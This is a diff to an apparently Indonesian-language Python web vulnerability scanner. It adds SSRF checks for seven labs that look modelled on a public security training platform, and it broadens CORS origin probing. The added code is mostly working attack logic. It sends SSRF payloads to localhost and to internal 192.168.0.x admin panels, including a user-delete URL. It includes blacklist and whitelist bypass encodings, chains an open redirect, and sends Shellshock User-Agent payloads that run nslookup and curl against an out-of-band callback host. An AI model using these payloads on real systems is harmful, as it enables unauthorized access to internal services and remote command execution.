@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-SATRIA Engine -- pemindai SQL injection, XSS, CSRF, Clickjacking, DOM-based, CORS, dan XXE terfokus.
+SATRIA Engine -- pemindai SQL injection, XSS, CSRF, Clickjacking, DOM-based, CORS, XXE, dan SSRF terfokus.
 
-File ini menguji 83 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE):
+File ini menguji 90 lab (18 SQL injection + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF):
 
 SQL Injection (01-18):
  01 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
@@ -158,7 +158,7 @@ SCAN_DEADLINE_SECONDS = 600.0
 _RUNTIME_CONFIG: dict[str, Any] = {"_ignored": []}
 
 # ----------------------------------------------------------------------------
-# Katalog: 83 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE).
+# Katalog: 90 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF).
 # ----------------------------------------------------------------------------
 CATALOG: list[tuple[int, str, str, str]] = [
     (1, "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data", "where_hidden", "high"),
@@ -247,6 +247,14 @@ CATALOG: list[tuple[int, str, str, str]] = [
     (81, "Exploiting XInclude to retrieve files", "xxe_xinclude_retrieve_files", "high"),
     (82, "Exploiting XXE via image file upload", "xxe_image_file_upload", "high"),
     (83, "Exploiting XXE to retrieve data by repurposing a local DTD", "xxe_repurpose_local_dtd", "high"),
+    # Server-side request forgery (SSRF) (84-90)
+    (84, "Basic SSRF against the local server", "ssrf_basic_local_server", "high"),
+    (85, "Basic SSRF against another back-end system", "ssrf_basic_backend_system", "high"),
+    (86, "Blind SSRF with out-of-band detection", "ssrf_blind_oob_detection", "medium"),
+    (87, "SSRF with blacklist-based input filter", "ssrf_blacklist_bypass", "high"),
+    (88, "SSRF with filter bypass via open redirection vulnerability", "ssrf_open_redirect_bypass", "high"),
+    (89, "Blind SSRF with Shellshock exploitation", "ssrf_blind_shellshock", "high"),
+    (90, "SSRF with whitelist-based input filter", "ssrf_whitelist_bypass", "high"),
 ]
 
 def lab_id_for(number: int) -> str:
@@ -262,7 +270,9 @@ def lab_id_for(number: int) -> str:
         return f"dom-{number:02d}"
     if number <= 74:
         return f"cors-{number:02d}"
-    return f"xxe-{number:02d}"
+    if number <= 83:
+        return f"xxe-{number:02d}"
+    return f"ssrf-{number:02d}"
 
 SQL_ERROR_PATTERNS: list[tuple[re.Pattern[str], str]] = [
     (re.compile(r"ora-\d{4,5}"), "oracle"),
@@ -1641,6 +1651,8 @@ class SatriaBaruScanner:
         # CORS & XXE (konservatif, berbasis bukti respons/probe terkontrol; anti false positive)
         self.phase_cors(self.pages)
         self.phase_xxe(self.pages, self.points)
+        # SSRF (konservatif, bukti in-band/OOB terverifikasi; anti false positive)
+        self.phase_ssrf(self.pages, self.points)
         return self.report()
 
     # ======================== XSS SCANNING PHASES (30 LABS) ========================
@@ -2272,22 +2284,42 @@ class SatriaBaruScanner:
     def _cors_candidate_urls(self, pages: list[Page]) -> list[str]:
         urls = [self.target_url]
         base = self.target_url.rstrip("/")
-        for suffix in ("/accountDetails", "/account", "/account/details", "/my-account",
-                       "/my-account?id=1", "/api/key", "/api/account", "/user", "/user/details",
-                       "/api/user", "/profile", "/me", "/accountDetails/"):
+        # Endpoint sensitif umum (account/detail/api/key/profile) yang sering mengembalikan data/ACAO reflektif
+        for suffix in (
+            "/accountDetails", "/accountDetails/", "/account", "/account/details", "/my-account",
+            "/my-account?id=1", "/my-account?id=wiener", "/api/key", "/api/account", "/api/user",
+            "/user", "/user/details", "/profile", "/me", "/accountDetail", "/accountdetails",
+            "/login", "/whoami", "/api/whoami",
+        ):
             urls.append(base + suffix)
             urls.append(urljoin(self.target_url, suffix.lstrip("/")))
-        for page in pages[:20]:
+        for page in pages[:30]:
             urls.append(page.url)
-            for form in page.forms[:6]:
+            # tautan/form/action pada halaman
+            for form in page.forms[:10]:
                 if form.action:
                     urls.append(form.action)
-            for link in getattr(page, "links", [])[:20]:
-                if re.search(r"(account|user|profile|detail|api|key)", str(link), re.I):
-                    urls.append(link)
+            for link in getattr(page, "links", [])[:40]:
+                if link:
+                    urls.append(str(link))
+            # temukan path/endpoint dalam HTML dan JS (fetch/axios/XHR/open) yang bernuansa akun/api
+            blob = (page.text or "") + "\n" + (page.js_text or "")
+            for m in re.finditer(r"""['"](/[^'"\s<>]{1,220})['"]""", blob):
+                cand = m.group(1).strip()
+                if cand.startswith("//"):
+                    continue
+                urls.append(urljoin(page.url, cand))
+            for m in re.finditer(r"""\b(?:fetch|axios\.(?:get|post|request)|open)\s*\(\s*(?:['"][A-Z]+['"]\s*,\s*)?['"]([^'"]{1,220})['"]""", blob, re.I):
+                cand = m.group(1).strip()
+                if cand.startswith("/") and not cand.startswith("//"):
+                    urls.append(urljoin(page.url, cand))
+                elif re.match(r"^https?://", cand, re.I):
+                    urls.append(cand)
         out: list[str] = []
         seen = set()
         for u in urls:
+            if not u:
+                continue
             try:
                 cu = canonical_url(u)
             except Exception:
@@ -2298,14 +2330,27 @@ class SatriaBaruScanner:
             out.append(cu)
 
         def score(u: str) -> int:
-            ul = u.lower()
+            ul = (u or "").lower()
             s = 0
-            for kw in ("accountdetail", "account", "detail", "api", "key", "user", "profile", "me"):
+            for kw, w in (("accountdetail", 8), ("account", 6), ("detail", 4), ("api", 5),
+                          ("key", 5), ("user", 4), ("profile", 4), ("me", 4), ("whoami", 4)):
                 if kw in ul:
-                    s += 4
+                    s += w
             return -s
         out.sort(key=score)
-        return out[:24]
+        # pastikan target utama tetap dicoba
+        ordered = []
+        seen2 = set()
+        for u in [self.target_url] + out:
+            try:
+                cu = canonical_url(u)
+            except Exception:
+                cu = u
+            if cu in seen2:
+                continue
+            seen2.add(cu)
+            ordered.append(cu)
+        return ordered[:40]
 
     @staticmethod
     def _resp_header(headers: dict[str, str] | None, name: str) -> str | None:
@@ -2324,67 +2369,514 @@ class SatriaBaruScanner:
         urls = self._cors_candidate_urls(pages)
         if not urls:
             return
-        target_host = (urlparse(self.target_url).hostname or "").strip()
+        target_host = (urlparse(self.target_url).hostname or "").strip().lower()
         evil_https = "https://evil-example.test"
-        # probe origin untuk 74 (trusted insecure protocols): origin http yang dipercaya secara tidak aman
+        # probe origin untuk 74 (trusted insecure protocols): origin http tidak aman yang mungkin dipercaya
         http_origins = ["http://evil-example.test"]
         if target_host:
+            host_parts = target_host.split(".")
             http_origins.extend([
                 f"http://{target_host}",
+                f"http://sub.{target_host}",
                 f"http://insecure.{target_host}",
                 f"http://stock.{target_host}",
+                f"http://api.{target_host}",
             ])
-            parts = target_host.split(".")
-            if len(parts) >= 3:
-                http_origins.append(f"http://insecure.{'.'.join(parts[1:])}")
+            # variasi subdomain tidak-aman pada domain induk (mis. stock.lab-domain / insecure.lab-domain)
+            if len(host_parts) >= 3:
+                parent = ".".join(host_parts[1:])
+                http_origins.extend([f"http://insecure.{parent}", f"http://stock.{parent}", f"http://sub.{parent}"])
+            if len(host_parts) >= 2:
+                parent2 = ".".join(host_parts[-2:])
+                http_origins.extend([f"http://insecure.{parent2}", f"http://stock.{parent2}"])
         # unikkan sambil jaga urutan
         seen_o = set()
         http_origin_list = []
         for o in http_origins:
-            if o not in seen_o:
-                seen_o.add(o)
-                http_origin_list.append(o)
+            if not o or o in seen_o:
+                continue
+            seen_o.add(o)
+            http_origin_list.append(o)
 
         for url in urls:
             if not self._within_budget():
                 return
             point = Point(key="cors", kind="page", label=f"endpoint {url}", url=url,
                           name="origin", original="", page_url=url, method="GET", interest=3)
-            # 72: basic origin reflection (arbitrary https origin reflected)
-            if 72 not in self._confirmed:
-                resp = self._request("GET", url, headers={"Origin": evil_https}, allow_redirects=False)
+
+            def _cors_probe(origin: str) -> tuple["Response", str | None, str | None]:
+                # Probe GET dengan Origin; ikuti redirect same-origin agar header pada respons akhir terbaca.
+                resp = self._request("GET", url, headers={"Origin": origin, "Accept": "application/json, text/plain, */*"},
+                                     allow_redirects=False)
                 acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
                 acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
+                # jika redirect, coba juga tujuan akhir (same-origin) dengan Origin yang sama
+                if resp.is_redirect and not acao:
+                    loc = self._resp_header(resp.headers, "Location")
+                    if loc:
+                        dest = urljoin(url, loc)
+                        if self._same_origin(dest):
+                            resp2 = self._request("GET", dest, headers={"Origin": origin, "Accept": "application/json, text/plain, */*"},
+                                                  allow_redirects=True)
+                            acao2 = self._resp_header(resp2.headers, "Access-Control-Allow-Origin")
+                            acac2 = self._resp_header(resp2.headers, "Access-Control-Allow-Credentials")
+                            if acao2:
+                                return resp2, acao2, acac2
+                return resp, acao, acac
+
+            # 72: basic origin reflection (arbitrary https origin reflected)
+            if 72 not in self._confirmed and self._within_budget():
+                resp, acao, acac = _cors_probe(evil_https)
                 if acao and acao.strip() == evil_https and acao.strip() != "*":
                     ev = (f"Origin probe ({evil_https}) ke {url} direfleksikan pada Access-Control-Allow-Origin={acao!r}"
                           + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
-                          + ". Bukti berbasis header respons CORS.")
+                          + f" (HTTP {resp.status}). Bukti berbasis header respons CORS terverifikasi.")
                     self._mark(72, point, ev, "cors_basic_origin_reflection")
+
             # 73: trusted null origin
             if 73 not in self._confirmed and self._within_budget():
-                resp = self._request("GET", url, headers={"Origin": "null"}, allow_redirects=False)
-                acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
-                acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
+                resp, acao, acac = _cors_probe("null")
                 if acao and acao.strip().lower() == "null":
                     ev = (f"Origin probe (null) ke {url} diterima: Access-Control-Allow-Origin={acao!r}"
                           + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
-                          + ". Bukti berbasis header respons CORS.")
+                          + f" (HTTP {resp.status}). Bukti berbasis header respons CORS terverifikasi.")
                     self._mark(73, point, ev, "cors_trusted_null_origin")
-            # 74: trusted insecure protocols (http origin reflected)
+
+            # 74: trusted insecure protocols (origin http:// direfleksikan)
             if 74 not in self._confirmed and self._within_budget():
                 for evil_http in http_origin_list:
                     if 74 in self._confirmed or not self._within_budget():
                         break
-                    resp = self._request("GET", url, headers={"Origin": evil_http}, allow_redirects=False)
-                    acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
-                    acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
+                    resp, acao, acac = _cors_probe(evil_http)
                     if acao and acao.strip() == evil_http and acao.strip().lower().startswith("http://"):
                         ev = (f"Origin probe dengan skema http tidak aman ({evil_http}) ke {url} direfleksikan: "
                               f"Access-Control-Allow-Origin={acao!r}"
                               + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
-                              + ". Bukti berbasis header respons CORS (protokol tidak aman dipercaya).")
+                              + f" (HTTP {resp.status}). Bukti berbasis header respons CORS (protokol tidak aman dipercaya).")
                         self._mark(74, point, ev, "cors_trusted_insecure_protocols")
                         break
+
+
+
+    # ======================== SSRF (konservatif, bukti respons/OOB terverifikasi) ========================
+
+    def _ssrf_admin_evidence(self, resp: "Response", baseline: "Response | None") -> bool:
+        """Bukti kuat SSRF in-band: respons memuat konten admin/internal yang tidak ada pada baseline."""
+        if not resp or resp.error or resp.status is None:
+            return False
+        body = (resp.text or "")
+        low = body.lower()
+        base_low = ((baseline.text or "").lower() if baseline else "")
+        admin_markers = (
+            "admin panel", "admin interface", "administrator panel",
+            "delete user", "delete carlos", "/admin/delete",
+            ">admin<", "href=\"/admin", "href='/admin",
+        )
+        if any(m in low for m in admin_markers):
+            if any(m in base_low for m in admin_markers) and similarity(normalize_text(body), normalize_text(base_low)) > 0.98:
+                return False
+            return True
+        if re.search(r"/admin\b", low) and re.search(r"\bdelete\b", low):
+            if re.search(r"/admin\b", base_low) and re.search(r"\bdelete\b", base_low):
+                return False
+            return True
+        if re.search(r"\b192\.168\.\d{1,3}\.\d{1,3}\b", body) and "admin" in low and "admin" not in base_low:
+            return True
+        return False
+
+    def _ssrf_fetcher_candidates(self, pages: list[Page], points: list[Point]) -> list[tuple[str, Any]]:
+        """Kumpulkan kandidat (kind, spec) untuk parameter/jalur yang kemungkinan mengambil URL/resource."""
+        cands: list[tuple[str, Any]] = []
+        seen = set()
+        urlish_names = ("stockapi", "stock_api", "stock", "url", "uri", "path", "dest", "destination",
+                        "feed", "fetch", "site", "page", "data", "reference", "resource", "next",
+                        "return", "returnurl", "continue", "view", "target", "endpoint", "proxy")
+
+        def add_point(p: Point):
+            k = ("point", p.kind, p.url, p.name, p.method)
+            if k in seen:
+                return
+            seen.add(k)
+            cands.append(("point", p))
+
+        for p in points:
+            if p.kind not in {"query", "form"}:
+                continue
+            name_l = (p.name or "").lower()
+            orig = (p.original or "").lower()
+            is_urlish = (name_l in urlish_names or any(x in name_l for x in ("url", "uri", "path", "stock", "fetch", "dest", "redir", "feed")))
+            looks_url = bool(re.search(r"^https?://|^/|localhost|127\.0\.0\.1", orig)) or "http" in orig
+            if is_urlish or looks_url:
+                add_point(p)
+        for page in pages:
+            for form in page.forms:
+                if not self._same_origin(form.action):
+                    continue
+                if DESTRUCTIVE_PATH_RE.search(urlparse(form.action).path or "/"):
+                    continue
+                for name, value, typ in form.fields:
+                    nl = (name or "").lower()
+                    vl = (value or "").lower()
+                    is_urlish = (nl in urlish_names or any(x in nl for x in ("url", "uri", "path", "stock", "fetch", "dest", "redir", "feed", "api")))
+                    looks_url = bool(re.search(r"^https?://|^/|localhost|127\.0\.0\.1", vl)) or "http" in vl or "stock" in nl
+                    if not (is_urlish or looks_url):
+                        continue
+                    key = f"ssrf|{(form.method or 'get').lower()}|{urlparse(form.action).path}|{name}"
+                    p = Point(key=key, kind="form", label=f"form `{name}`", url=form.action, name=name,
+                              original=value or "", page_url=page.url, method=(form.method or "get").upper(),
+                              fields=form.fields, interest=8)
+                    add_point(p)
+        for page in pages[:12]:
+            u = page.url
+            if not self._same_origin(u):
+                continue
+            k = ("referer", u)
+            if k not in seen:
+                seen.add(k)
+                cands.append(("referer", u))
+        def pri(c):
+            if c[0] == "point":
+                n = (c[1].name or "").lower()
+                if n in ("stockapi", "stock_api", "url", "uri"):
+                    return 0
+                if "stock" in n or "url" in n or "path" in n:
+                    return 1
+                return 2
+            return 5
+        cands.sort(key=pri)
+        return cands[:30]
+
+    def _ssrf_send_point(self, point: Point, value: str) -> "Response":
+        return self.send(point, value)
+
+    def _ssrf_try_payloads(self, point: Point, payloads: list[str], baseline: "Response | None") -> tuple[str | None, "Response | None"]:
+        for payload in payloads:
+            if not self._within_budget():
+                break
+            resp = self._ssrf_send_point(point, payload)
+            if self._ssrf_admin_evidence(resp, baseline):
+                return payload, resp
+        return None, None
+
+    def _ssrf_find_open_redirect(self, pages: list[Page], points: list[Point]) -> str | None:
+        """Cari open redirect internal (bukti: Location header ke URL eksternal) untuk bypass 88."""
+        external_targets = ["https://example.com/", "http://example.com/"]
+        redir_names = ("next", "path", "return", "returnurl", "redirect", "url", "continue", "dest", "destination", "redir", "go", "goto")
+        candidates: list[tuple[str, str, dict | None, str, str]] = []
+        for p in points:
+            if p.kind != "query":
+                continue
+            nl = (p.name or "").lower()
+            if nl in redir_names or any(x in nl for x in ("redirect", "return", "next", "url", "path", "dest")):
+                for ext in external_targets:
+                    candidates.append(("GET", p.url, None, p.name, ext))
+        for page in pages:
+            for form in page.forms:
+                if not self._same_origin(form.action):
+                    continue
+                if DESTRUCTIVE_PATH_RE.search(urlparse(form.action).path or "/"):
+                    continue
+                for name, value, typ in form.fields:
+                    nl = (name or "").lower()
+                    if nl in redir_names or any(x in nl for x in ("redirect", "return", "next", "url", "path", "dest")):
+                        for ext in external_targets:
+                            candidates.append((form.method.upper(), form.action, {n: v for n, v, _ in form.fields}, name, ext))
+        seen = set()
+        for method, url, base_data, pname, ext in candidates[:60]:
+            if not self._within_budget():
+                break
+            key = (method, url, pname, ext)
+            if key in seen:
+                continue
+            seen.add(key)
+            try:
+                if method == "GET":
+                    purl = urlparse(url)
+                    pairs = parse_qsl(purl.query, keep_blank_values=True)
+                    out = [(k, (ext if k == pname else v)) for k, v in pairs]
+                    if pname not in [k for k, _ in pairs]:
+                        out.append((pname, ext))
+                    target_url = urlunparse((purl.scheme, purl.netloc, purl.path or "/", purl.params, urlencode(out, doseq=True), ""))
+                    resp = self._request("GET", target_url, allow_redirects=False)
+                else:
+                    data = dict(base_data or {})
+                    data[pname] = ext
+                    resp = self._request("POST", url, data=data, allow_redirects=False)
+                loc = self._resp_header(resp.headers, "Location") if resp.headers else None
+                if resp.is_redirect and loc and not self._same_origin(urljoin(url, loc)):
+                    if method == "GET" and self._same_origin(target_url):
+                        pu = urlparse(target_url)
+                        return pu.path + ("?" + pu.query if pu.query else "")
+                    if method == "GET":
+                        return target_url
+            except Exception:
+                continue
+        for page in pages:
+            parsed = urlparse(page.url)
+            for name, val in parse_qsl(parsed.query, keep_blank_values=True):
+                nl = name.lower()
+                if nl in ("next", "path", "return", "redirect", "url"):
+                    for ext in external_targets:
+                        if not self._within_budget():
+                            break
+                        pairs = parse_qsl(parsed.query, keep_blank_values=True)
+                        out = [(k, (ext if k == name else v)) for k, v in pairs]
+                        target_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path or "/", parsed.params, urlencode(out, doseq=True), ""))
+                        resp = self._request("GET", target_url, allow_redirects=False)
+                        loc = self._resp_header(resp.headers, "Location") if resp.headers else None
+                        if resp.is_redirect and loc and not self._same_origin(urljoin(page.url, loc)):
+                            pu = urlparse(target_url)
+                            return pu.path + ("?" + pu.query if pu.query else "")
+        return None
+
+    def phase_ssrf(self, pages: list[Page], points: list[Point]) -> None:
+        """Deteksi konservatif SSRF (84-90). Konfirmasi hanya pada bukti kuat:
+        - in-band: respons memuat konten admin/internal yang jelas dan berbeda dari baseline (84,85,87,88,90)
+        - blind: interaksi/OOB terverifikasi untuk payload spesifik (86,89)
+        Tanpa bukti kuat -> not_confirmed (anti false positive)."""
+        fetchers = self._ssrf_fetcher_candidates(pages, points)
+        point_fetchers = [(k, v) for k, v in fetchers if k == "point"]
+        referer_urls = [v for k, v in fetchers if k == "referer"]
+
+        baselines: dict[str, "Response | None"] = {}
+        for _, p in point_fetchers:
+            try:
+                baselines[p.key] = self.send(p, p.original)
+            except Exception:
+                baselines[p.key] = None
+
+        def mark_ssrf(num: int, point: Point, ev: str, method_name: str):
+            self._mark(num, point, ev, method_name)
+
+        # 84: Basic SSRF against the local server
+        if 84 not in self._confirmed:
+            local_payloads = [
+                "http://localhost/admin", "http://127.0.0.1/admin", "http://127.0.0.1/",
+                "http://127.1/admin", "http://[::1]/admin", "http://0/admin",
+                "http://localhost/admin/delete?username=carlos",
+            ]
+            for _, p in point_fetchers:
+                if 84 in self._confirmed or not self._within_budget():
+                    break
+                payload, resp = self._ssrf_try_payloads(p, local_payloads, baselines.get(p.key))
+                if payload and resp:
+                    ev = (f"Payload SSRF ke server lokal ({payload}) pada {p.label} ({p.url}) mengembalikan konten admin/internal "
+                          f"yang terverifikasi berbeda dari baseline (HTTP {resp.status}). Bukti in-band respons teramati.")
+                    mark_ssrf(84, p, ev, "ssrf_basic_local_server")
+
+        # 85: Basic SSRF against another back-end system
+        if 85 not in self._confirmed:
+            for _, p in point_fetchers:
+                if 85 in self._confirmed or not self._within_budget():
+                    break
+                base = baselines.get(p.key)
+                found_payload = None
+                found_resp = None
+                for i in range(1, 256):
+                    if 85 in self._confirmed or not self._within_budget() or found_payload:
+                        break
+                    payload = f"http://192.168.0.{i}:8080/admin"
+                    resp = self._ssrf_send_point(p, payload)
+                    if self._ssrf_admin_evidence(resp, base):
+                        found_payload, found_resp = payload, resp
+                        break
+                if not found_payload:
+                    for payload in ["http://192.168.0.1:8080/admin", "http://192.168.0.2:8080/admin",
+                                    "http://10.0.0.1/admin", "http://172.17.0.1/admin",
+                                    "http://192.168.0.1/admin"]:
+                        if 85 in self._confirmed or not self._within_budget():
+                            break
+                        resp = self._ssrf_send_point(p, payload)
+                        if self._ssrf_admin_evidence(resp, base):
+                            found_payload, found_resp = payload, resp
+                            break
+                if found_payload and found_resp:
+                    ev = (f"Payload SSRF ke sistem back-end lain ({found_payload}) pada {p.label} ({p.url}) mengembalikan "
+                          f"konten admin/internal yang terverifikasi (HTTP {found_resp.status}). Bukti in-band respons teramati.")
+                    mark_ssrf(85, p, ev, "ssrf_basic_backend_system")
+
+        # 87: SSRF with blacklist-based input filter
+        if 87 not in self._confirmed:
+            bypass_payloads = [
+                "http://127.1/admin", "http://2130706433/admin", "http://017700000001/admin",
+                "http://0x7f000001/admin", "http://127.0.1/admin", "http://[::ffff:127.0.0.1]/admin",
+                "http://127.1/%61dmin", "http://127.1/Admin", "http://0/admin",
+                "http://2130706433:80/admin",
+            ]
+            for _, p in point_fetchers:
+                if 87 in self._confirmed or not self._within_budget():
+                    break
+                payload, resp = self._ssrf_try_payloads(p, bypass_payloads, baselines.get(p.key))
+                if payload and resp:
+                    ev = (f"Payload SSRF dengan bypass filter blacklist ({payload}) pada {p.label} ({p.url}) "
+                          f"mengembalikan konten admin/internal terverifikasi (HTTP {resp.status}). Bukti in-band respons teramati.")
+                    mark_ssrf(87, p, ev, "ssrf_blacklist_bypass")
+
+        # 90: SSRF with whitelist-based input filter
+        if 90 not in self._confirmed:
+            for _, p in point_fetchers:
+                if 90 in self._confirmed or not self._within_budget():
+                    break
+                orig = (p.original or "")
+                allowed_host = (urlparse(orig).hostname or "") if "://" in orig else ""
+                allowed_hosts = [h for h in [allowed_host, "stock.weliketoshop.net", "expected-host"] if h]
+                candidates: list[str] = []
+                for ah in allowed_hosts:
+                    candidates.extend([
+                        f"http://localhost:80#@{ah}/admin",
+                        f"http://localhost:80%2523@{ah}/admin",
+                        f"http://localhost:80%23@{ah}/admin",
+                        f"http://{ah}@127.0.0.1/admin",
+                        f"http://{ah}@localhost/admin",
+                        f"http://127.0.0.1:80\\@{ah}/admin",
+                        f"http://127.0.0.1%2523@{ah}/admin",
+                        f"http://localhost/admin#@{ah}",
+                        f"http://localhost/admin?@{ah}",
+                        f"http://{ah}#@127.0.0.1/admin",
+                    ])
+                candidates.extend([
+                    "http://localhost:80%2523@stock.weliketoshop.net/admin",
+                    "http://127.0.0.1:80%2523@stock.weliketoshop.net/admin",
+                ])
+                seen_pl = set()
+                uniq = []
+                for c in candidates:
+                    if c not in seen_pl:
+                        seen_pl.add(c)
+                        uniq.append(c)
+                payload, resp = self._ssrf_try_payloads(p, uniq[:45], baselines.get(p.key))
+                if payload and resp:
+                    ev = (f"Payload SSRF dengan bypass filter whitelist ({payload}) pada {p.label} ({p.url}) "
+                          f"mengembalikan konten admin/internal terverifikasi (HTTP {resp.status}). Bukti in-band respons teramati.")
+                    mark_ssrf(90, p, ev, "ssrf_whitelist_bypass")
+
+        # 88: SSRF with filter bypass via open redirection vulnerability
+        if 88 not in self._confirmed:
+            redirector = self._ssrf_find_open_redirect(pages, points)
+            if redirector:
+                internal_targets = ["http://192.168.0.12:8080/admin", "http://192.168.0.12:8080/admin/delete?username=carlos",
+                                    "http://127.0.0.1/admin", "http://localhost/admin"]
+                for _, p in point_fetchers:
+                    if 88 in self._confirmed or not self._within_budget():
+                        break
+                    base = baselines.get(p.key)
+                    for it in internal_targets:
+                        if 88 in self._confirmed or not self._within_budget():
+                            break
+                        payload = redirector
+                        try:
+                            if "http://" in redirector or "https://" in redirector:
+                                payload = re.sub(r"https?://[^&\s]+", it, redirector)
+                            else:
+                                sep = "&" if "?" in redirector else "?"
+                                for rparam in ("path", "next", "url", "redirect", "dest", "return"):
+                                    if re.search(r"(?i)(^|[?&])" + rparam + r"=", redirector):
+                                        payload = re.sub(r"(?i)(" + rparam + r"=)[^&]*", r"\1" + it, redirector)
+                                        break
+                                else:
+                                    payload = redirector + sep + "path=" + it
+                        except Exception:
+                            payload = redirector
+                        resp = self._ssrf_send_point(p, payload)
+                        if self._ssrf_admin_evidence(resp, base):
+                            ev = (f"SSRF via open redirect terkonfirmasi: fetcher {p.label} menerima redirector ({redirector}) "
+                                  f"menuju target internal ({it}) dan respons memuat konten admin/internal terverifikasi "
+                                  f"(HTTP {resp.status}). Bukti in-band berantai (open redirect + SSRF).")
+                            mark_ssrf(88, p, ev, "ssrf_open_redirect_bypass")
+                            break
+
+        # 86 & 89: Blind SSRF (OOB) dan Blind SSRF with Shellshock (bukti OOB terverifikasi)
+        if self.oob and getattr(self.oob, "domain", None) and (86 not in self._confirmed or 89 not in self._confirmed):
+            oob_domain = self.oob.domain
+            oob_token = getattr(self.oob, "token", "") or ""
+
+            def _oob_host(tag: str) -> str:
+                return f"{oob_token}.{tag}.{oob_domain}".strip(".")
+
+            def _poll():
+                try:
+                    return self._poll_oob()
+                except Exception:
+                    return None
+
+            # 86: Blind SSRF with out-of-band detection (URL fetcher dan/atau Referer header)
+            if 86 not in self._confirmed:
+                oob_url = f"http://{_oob_host('ssrf86')}/"
+                for _, p in point_fetchers:
+                    if 86 in self._confirmed or not self._within_budget():
+                        break
+                    self._ssrf_send_point(p, oob_url)
+                    got = _poll()
+                    if got and getattr(got, "interactions", None):
+                        ev = (f"Interaksi OOB terverifikasi: server melakukan permintaan ke {oob_url} saat payload SSRF "
+                              f"dikirim via {p.label} ({p.url}). Bukti blind SSRF (out-of-band) terverifikasi.")
+                        mark_ssrf(86, p, ev, "ssrf_blind_oob_detection")
+                        break
+                if 86 not in self._confirmed:
+                    for ref_url in referer_urls[:10]:
+                        if 86 in self._confirmed or not self._within_budget():
+                            break
+                        self._request("GET", ref_url, headers={"Referer": oob_url}, allow_redirects=False)
+                        got = _poll()
+                        if got and getattr(got, "interactions", None):
+                            point = Point(key="ssrf-referer", kind="header", label=f"Referer pada {ref_url}", url=ref_url,
+                                          name="Referer", original="", page_url=ref_url, method="GET", interest=7)
+                            ev = (f"Interaksi OOB terverifikasi: server mem-fetch URL pada header Referer ({oob_url}) "
+                                  f"saat mengakses {ref_url}. Bukti blind SSRF (out-of-band) terverifikasi.")
+                            mark_ssrf(86, point, ev, "ssrf_blind_oob_referer")
+
+            # 89: Blind SSRF with Shellshock exploitation (payload pada User-Agent ke target internal, bukti OOB)
+            if 89 not in self._confirmed:
+                for i in [1, 2, 10, 25, 50, 100, 150, 200, 254]:
+                    if 89 in self._confirmed or not self._within_budget():
+                        break
+                    target_internal = f"http://192.168.0.{i}:8080"
+                    oob_cb = _oob_host(f"sh89-{i}")
+                    ua_payloads = [
+                        "() { :; }; /usr/bin/nslookup " + oob_cb,
+                        "() { :; }; nslookup " + oob_cb,
+                        "() { :; }; /usr/bin/curl http://" + oob_cb + "/",
+                    ]
+                    for ua in ua_payloads:
+                        if 89 in self._confirmed or not self._within_budget():
+                            break
+                        sent = False
+                        for _, p in point_fetchers[:12]:
+                            if 89 in self._confirmed or not self._within_budget():
+                                break
+                            try:
+                                if p.kind == "form":
+                                    action, params, data = self._form_request_parts(p, target_internal)
+                                    if p.method == "GET":
+                                        self._request("GET", action, params=params, headers={"User-Agent": ua}, allow_redirects=False)
+                                    else:
+                                        self._request("POST", action, data=data, headers={"User-Agent": ua}, allow_redirects=False)
+                                elif p.kind == "query":
+                                    self._request("GET", self._with_query_value(p, target_internal),
+                                                  headers={"User-Agent": ua}, allow_redirects=False)
+                                else:
+                                    continue
+                                sent = True
+                            except Exception:
+                                continue
+                        for ref_url in referer_urls[:6]:
+                            if 89 in self._confirmed or not self._within_budget():
+                                break
+                            self._request("GET", ref_url, headers={"User-Agent": ua, "Referer": target_internal}, allow_redirects=False)
+                            sent = True
+                        if sent:
+                            got = _poll()
+                            if got and getattr(got, "interactions", None):
+                                point = Point(key="ssrf-shellshock", kind="oob", label=f"Shellshock SSRF ke {target_internal}", url=self.target_url,
+                                              name="User-Agent", original=ua[:60], page_url=self.target_url, method="GET", interest=8)
+                                ev = (f"Interaksi OOB terverifikasi setelah injeksi payload Shellshock (User-Agent) pada permintaan "
+                                      f"yang menargetkan host internal ({target_internal}) via jalur SSRF. "
+                                      f"Bukti blind SSRF dengan eksploitasi Shellshock (out-of-band) terverifikasi.")
+                                mark_ssrf(89, point, ev, "ssrf_blind_shellshock")
+                                break
+
+        # Lab tanpa bukti kuat (in-band admin/internal terverifikasi atau interaksi/exfil OOB terverifikasi)
+        # tetap not_confirmed (anti false positive).
 
 
     # ======================== XXE (konservatif, probe terkontrol & bukti kuat) ========================
@@ -2886,7 +3378,7 @@ class SatriaBaruScanner:
             "version": __version__,
             "target": self.target_url,
             "generated_at": datetime.now(timezone.utc).isoformat(),
-            "catalog_scope": "18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking labs (64 total)",
+            "catalog_scope": "18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM + 3 CORS + 9 XXE + 7 SSRF labs (90 total)",
             "summary": (lambda confirmed_labs: {
                 "confirmed": len(confirmed_labs),
                 "confirmed_manual": len(confirmed_labs),
@@ -3036,9 +3528,9 @@ def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
         "<style>body{font-family:system-ui,Arial;margin:24px;color:#17202b}table{border-collapse:collapse;width:100%}"
         "th,td{border:1px solid #d8e2ea;padding:8px;vertical-align:top}th{background:#edf3f8}"
         ".confirmed{color:#0b7a3b;font-weight:700}.not_confirmed{color:#7a5a12}</style></head><body>"
